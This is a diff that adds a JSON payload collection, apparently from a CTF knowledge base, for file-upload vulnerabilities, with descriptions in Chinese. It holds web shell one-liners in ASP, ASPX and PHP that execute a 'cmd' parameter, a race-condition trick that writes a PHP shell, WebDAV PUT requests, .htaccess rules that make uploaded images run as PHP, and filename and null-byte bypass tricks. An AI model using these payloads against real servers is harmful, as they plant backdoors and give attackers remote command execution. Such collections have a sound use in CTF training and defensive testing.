@@ -1,0 +1,100 @@
+{
+  "id": "payload-file_upload-001",
+  "type": "payload",
+  "category": "file_ops",
+  "subcategory": "file_upload",
+  "name": "文件上传漏洞 Payload 集合",
+  "description": "从 文件上传漏洞.md 提取的实战 Payload",
+  "payloads": [
+    {
+      "payload": "<%eval request(\"cmd\")%>",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "<%@ Page Language=\"Jscript\"%>\r\n<%eval(Request.Item[\"cmd\"],\"unsafe\");%>",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "<?php @eval($_REQUEST['cmd']);?>",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "telnet 172.16.132.161 80\r\n\r\nOPTIONS / HTTP/1.1\r\nHOST:172.16.132.161",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "httpd.conf\r\n\r\n;开启模块\r\nLoadModule dav_module modules/mod_dav.so\r\nLoadModule dav_fs_module modules/mod_dav_fs.so\r\n\r\n;启用模块\r\n<Directory />\r\n    Options +Indexes +FollowSymLinks +ExecCGI\r\n    AllowOverride All\r\n    Order allow,deny\r\n    Allow from all\r\n    Require all granted\r\n    DAV On\r\n</Directory>\r\n\r\n开启文件锁\r\nDavLockDB c:\\phpstudy\\www\\DavLock",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "telnet 172.16.132.161 80\r\n\r\nPUT /info.php HTTP/1.1\r\nHOST: 172.16.132.161\r\nContent-Length: 18\r\n\r\n<?php phpinfo();?>",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "<form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\">\r\n                <p>请选择要上传的图片：</p><p>\r\n                <input class=\"input_file\" type=\"file\" name=\"upload_file\">\r\n                <input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\">\r\n            </p>\r\n</form>",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "function isImage($filename){\r\n    $types = '.jpeg|.png|.gif';\r\n    if(file_exists($filename)){\r\n        $info = getimagesize($filename);\r\n        $ext = image_type_to_extension($info[2]);\r\n        if(stripos($types,$ext)){\r\n            return $ext;\r\n        }else{\r\n            return false;\r\n        }\r\n    }else{\r\n        return false;\r\n    }\r\n}",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "# define width 16\r\n# define height 7\r\nAddType application/x-httpd-php .png",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "AddHandler php5-script php",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "<FilesMatch \"1997sty\">\r\nSetHandler application/x-httpd-php\r\n</FilesMatch>",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "test.asp.\r\n        \r\n    test.asp(空格)\r\n        \r\n    test.php.\r\n        \r\n    test.php \r\n        \r\n    test.php::$DATA",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "jsp：jspx、jspf、jsps\r\n    asp：asa、cer、aspx、cdx、ashx、htr、asax\r\n    php：php3、php4、php5、php7、phpt、phtml",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "1.首先上传一个写Shell的php\r\n    <?php fputs(fopen('shell.php',w),'<?php @eval($_POST[\"cmd\"]);?>');?>，\r\n    while1循环访问该文件，持续上传，直到竞争完成文件创建。\r\n         \r\n    2.循环上传一句话，持续尝试访问该页面。",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    },
+    {
+      "payload": "两种情况：一种是%00，一种是0x00\r\n    前者用在GET传参，%00作为URL会被URL解码，对应的是\\0\r\n    后者用于POST，POST传送的字符不会经过URL解码，所以需要将其改为十六进制的0x00\r\n    00截断的目的在于，（php基于C）当PHP中的函数将\\0视为字符串的终止，因此只有当文件名变量可控并且不会进行去空字符操作的时候，同时有函数调用这个字符串的时候才有效。",
+      "context": "文件上传",
+      "source": "文件上传漏洞.md"
+    }
+  ],
+  "related_theory": [
+    "theory-file-upload-001"
+  ],
+  "related_pocs": [
+    "pocs/high_value/afrog\\afrog-pocs\\vulnerability\\hikvision-ivms-8700-fileupload.yaml"
+  ],
+  "tags": [
+    "文件上传",
+    "webshell",
+    "上传绕过",
+    "file_ops"
+  ],
+  "severity": "high",
+  "source": "Des-CTF-Knowledge/文件上传漏洞.md",
+  "last_updated": "2026-10-22"
+}
